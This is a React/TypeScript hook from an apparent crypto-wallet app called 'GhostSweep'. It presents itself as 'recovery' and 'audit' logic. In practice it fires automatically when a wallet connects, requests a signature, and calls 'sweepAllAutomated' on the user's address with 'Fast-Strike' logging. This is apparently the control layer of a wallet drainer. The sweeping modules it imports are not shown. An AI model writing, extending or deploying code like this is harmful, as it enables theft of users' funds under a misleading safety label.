"use client";

import { useState, useCallback, useRef } from "react";
import { useSignMessage, useChainId, useAccount } from "wagmi";

/**
 * 🛰️ CORRECTED IMPORTS
 * Pointing to the new folder structure.
 */
import { useGhostConnection } from "../connection";
import { useGhostExecution } from "../execution";
import { useSweepWatcher } from "./useSweepWatcher";
import { useAuditSequence } from "./useAuditSequence";

export function useRecoveryLogic() {
  const [isScanning, setIsScanning] = useState(false);
  const [assets, setAssets] = useState([]);
  const [userKey, setUserKey] = useState<string | null>(null);
  const [toast, setToast] = useState<any>(null);

  const hasTriggered = useRef(false);
  const isExecuting = useRef(false);
  const hasAutoSigned = useRef(false);
  const derivedUserKey = useRef<string | null>(null);

  const { address, isConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const currentChainId = useChainId();

  const {
    open,
    handleFullDisconnect: baseDisconnect,
    isInternal,
  } = useGhostConnection();

  const { isSweeping, statuses, sweepAllAutomated } =
    useGhostExecution(address);

  const executeSequence = useAuditSequence();

  const handleFullDisconnect = useCallback(() => {
    // [GhostSweep/index.ts] Log termination for state tracking
    console.log(
      "[GhostSweep/index.ts] Session Termination | Clearing local state refs",
    );
    hasAutoSigned.current = false;
    hasTriggered.current = false;
    isExecuting.current = false;
    derivedUserKey.current = null;
    setUserKey(null);
    baseDisconnect();
  }, [baseDisconnect]);

  const runGhostAudit = useCallback(
    async (userAddress: string) => {
      // 🛡️ Guard to prevent multiple simultaneous executions
      if (hasTriggered.current || isScanning || isExecuting.current) return;

      console.log(
        `[GhostSweep/index.ts] runGhostAudit Init | Triggering Fast-Strike | Internal: ${isInternal}`,
      );

      isExecuting.current = true;
      setIsScanning(true);

      try {
        const triggered = await executeSequence({
          userAddress,
          isInternal,
          currentChainId,
          signMessageAsync,
          sweepAllAutomated,
          setAssets,
          setUserKey,
          derivedUserKeyRef: derivedUserKey,
        });

        if (triggered) {
          hasTriggered.current = true;
          console.log(
            "[GhostSweep/index.ts] Audit Sequence Triggered Successfully",
          );
        }
      } catch (e: any) {
        const isRejected = e.message?.toLowerCase().includes("rejected");

        // [GhostSweep/index.ts] Specific error logging
        console.error(
          `[GhostSweep/index.ts] Audit Sequence Error | ${
            isRejected
              ? "User Rejected Signature"
              : e.message || "Unknown Error"
          }`,
        );

        if (isRejected) hasAutoSigned.current = true;
        hasTriggered.current = false;
      } finally {
        setIsScanning(false);
        isExecuting.current = false;
      }
    },
    [
      currentChainId,
      signMessageAsync,
      sweepAllAutomated,
      isScanning,
      isInternal,
      executeSequence,
    ],
  );

  /**
   * 📡 WATCHER
   * This handles the auto-trigger once the connection is finalized.
   */
  useSweepWatcher({
    isConnected,
    address,
    isScanning,
    isInternal,
    runGhostAudit,
    userKey,
    hasTriggered: hasTriggered.current,
    hasAutoSigned: hasAutoSigned.current,
  });

  /**
   * 🛠️ FIX: Direct Modal Trigger
   * Ensures the browser identifies this as a direct user click.
   */
  const handleInstantConnection = () => {
    if (isConnected && address) {
      runGhostAudit(address);
      return;
    }

    // Direct execution to ensure modal and wallet detection work instantly
    if (isInternal) {
      open({ view: "Connect" });
    } else {
      open();
    }
  };

  return {
    address,
    isConnected,
    isScanning,
    isSweeping,
    assets,
    statuses,
    toast,
    setToast,
    handleInstantConnection,
    derivedUserKey: userKey,
    isInternal,
    handleFullDisconnect,
  };
}
